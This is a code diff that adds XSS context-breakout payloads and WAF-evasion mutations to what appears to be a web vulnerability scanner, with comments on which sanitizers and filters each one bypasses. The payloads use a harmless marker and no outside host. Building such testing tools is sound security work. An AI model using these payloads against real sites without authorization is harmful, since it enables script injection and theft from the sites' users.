@@ -113,6 +113,81 @@ PAYLOAD_VARIANTS = {
     # JS/template contexts.
     "template-literal-breakout": ('${(1)}<dXsS>',        '${(1)}<dXsS>'),
     "html-comment-breakout":     ('--><dXsS>',           '--><dXsS>'),
+
+    # Phase 1.2 milestone 2 additions ---------------------------------------
+    # Nested-script sanitizer bypass. Some allowlist sanitizers strip
+    # <script> at the top level but do not recurse into SVG/MathML foreign
+    # content, so the inner <script> executes.
+    "svg-script-nested-breakout": (
+        '"><svg><script>1</script></svg><dXsS>',
+        '<svg><script>1</script></svg><dXsS>',
+    ),
+    # MathML foreign-content surface. mglyph is a rare sink that some
+    # DOMPurify-derivatives missed until 2.4+.
+    "math-mtext-breakout": (
+        '"><math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
+        '<math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
+    ),
+    # Plugin-object surfaces. Rarely allowlisted but sometimes reach the
+    # DOM through Markdown or WYSIWYG editors.
+    "object-data-breakout": (
+        '"><object data=data:text/html,<dXsS>></object>',
+        '<object data=data:text/html,<dXsS>></object>',
+    ),
+    "embed-src-breakout": (
+        '"><embed src=data:text/html,<dXsS>>',
+        '<embed src=data:text/html,<dXsS>>',
+    ),
+    # Legacy tags with modern event handlers. Sanitizers focused on
+    # <script>/<img>/<svg> often forget these.
+    "marquee-onstart-breakout": (
+        '"><marquee onstart=1><dXsS></marquee>',
+        '<marquee onstart=1><dXsS></marquee>',
+    ),
+    "select-onfocus-breakout": (
+        '"><select autofocus onfocus=1><dXsS></select>',
+        '<select autofocus onfocus=1><dXsS></select>',
+    ),
+    "textarea-onfocus-breakout": (
+        '"><textarea autofocus onfocus=1><dXsS></textarea>',
+        '<textarea autofocus onfocus=1><dXsS></textarea>',
+    ),
+    # HTML5 form action override. A stored button with `formaction=` hijacks
+    # the submit destination of the outer form.
+    "form-formaction-breakout": (
+        '"><form><button formaction=javascript:1><dXsS></button></form>',
+        '<form><button formaction=javascript:1><dXsS></button></form>',
+    ),
+    # data: URI iframe. Bypasses text-only sanitizers because the payload
+    # rides inside the iframe's src attribute value.
+    "iframe-data-uri-breakout": (
+        '"><iframe src=data:text/html,<dXsS>>',
+        '<iframe src=data:text/html,<dXsS>>',
+    ),
+    # JS double-quoted string escape. Complements script-breakout (which is
+    # single-quoted). Together they cover both string-quote conventions.
+    "js-double-string-breakout": (
+        '";<dXsS>//',
+        '<dXsS>',
+    ),
+    # javascript: href on anchor. Extremely common in real targets; users
+    # click, alert fires.
+    "anchor-href-javascript-breakout": (
+        '"><a href=javascript:1><dXsS></a>',
+        '<a href=javascript:1><dXsS></a>',
+    ),
+    # <noscript> context. Some sanitizers do NOT parse noscript children
+    # (because scripting is assumed on) so injected content leaks in.
+    "noscript-breakout": (
+        '"><noscript><p title="</noscript><dXsS>',
+        '</noscript><dXsS>',
+    ),
+    # <style> block. CSS injection surface -- @import can pull external
+    # payload, but even without it the tag survival proves the escape.
+    "style-tag-breakout": (
+        '"><style>@import url(<dXsS>)</style>',
+        '<style>@import url(<dXsS>)</style>',
+    ),
 }
 
 
@@ -148,6 +223,27 @@ _WAF_MUTATIONS = [
     # decodes once, we land back to `<dXsS>` on final render. WAFs that
     # only decode once still see `%253C`.
     ("double-url-encode", lambda s: s.replace('<dXsS>', '%253CdXsS%253E')),
+
+    # Phase 1.2 milestone 2 additions --------------------------------------
+    # Carriage return is HTML5 whitespace inside a tag; same idea as
+    # tab-in-tag / newline-in-tag but a distinct byte a WAF regex may miss.
+    ("cr-in-tag",         lambda s: s.replace('<dXsS>', '<dXsS\r>')),
+
+    # Form feed. Rarer WAF coverage than \t\n\r; still HTML5-legal.
+    ("form-feed-in-tag",  lambda s: s.replace('<dXsS>', '<dXsS\f>')),
+
+    # CRLF combined. Belt-and-suspenders whitespace bypass.
+    ("crlf-in-tag",       lambda s: s.replace('<dXsS>', '<dXsS\r\n>')),
+
+    # Null byte in the tag. Classic bypass for WAFs that treat NUL as a
+    # string terminator; the servlet layer often passes the whole thing
+    # through. Encoded as %00 so it survives text-based URL transport.
+    ("null-byte-tag",     lambda s: s.replace('<dXsS>', '<dXsS%00>')),
+
+    # Backslash before closing bracket. Some WAFs anchor on `<[A-Za-z]+>`
+    # exactly; a trailing backslash breaks the pattern but a lenient
+    # HTML parser reforms the tag.
+    ("backslash-tag",     lambda s: s.replace('<dXsS>', '<dXsS\\>')),
 ]
 
 
